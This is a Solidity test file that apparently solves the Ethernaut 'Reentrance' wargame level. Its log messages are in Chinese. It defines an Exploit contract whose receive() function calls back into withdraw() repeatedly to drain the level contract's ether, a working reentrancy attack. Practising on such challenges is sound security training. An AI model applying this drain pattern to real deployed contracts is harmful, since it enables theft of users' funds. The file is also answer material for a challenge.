// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        uint256 insertCoin = ReentranceFactory(payable(address(levelFactory))).insertCoin();
        levelAddress = payable(this.createLevelInstance{value : insertCoin}(true));
        level = Reentrance(levelAddress);

        // Check that the contract is correctly setup
        assertEq(address(level).balance, insertCoin);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);
        console.log("level total balance : %s", address(level).balance);
        // 先充钱
        console.log("充值");
        Exploit expContract = new Exploit(level);
        level.donate{value : 0.001 ether}(address(expContract));
        console.log("level total balance : %s", address(level).balance);
        console.log("expContract balance : %s", level.balanceOf(address(expContract)));
        // 提现
        expContract.withdraw(level.balanceOf(address(expContract)));
        console.log("提现");
        console.log("level total balance : %s", address(level).balance);
        console.log("expContract total balance : %s", address(expContract).balance);
        vm.stopPrank();
    }
}

contract Exploit {
    Reentrance public rContract;

    constructor (Reentrance _rContract) public {
        rContract = _rContract;
    }

    receive() external payable {
        console.log("调用receive()函数");
        uint totalBalance = address(rContract).balance;
        if (totalBalance > 0) {
            rContract.withdraw(msg.value);
        }

        //        return true;
    }

    function withdraw(uint256 _amount) public {
        rContract.withdraw(_amount);
    }
}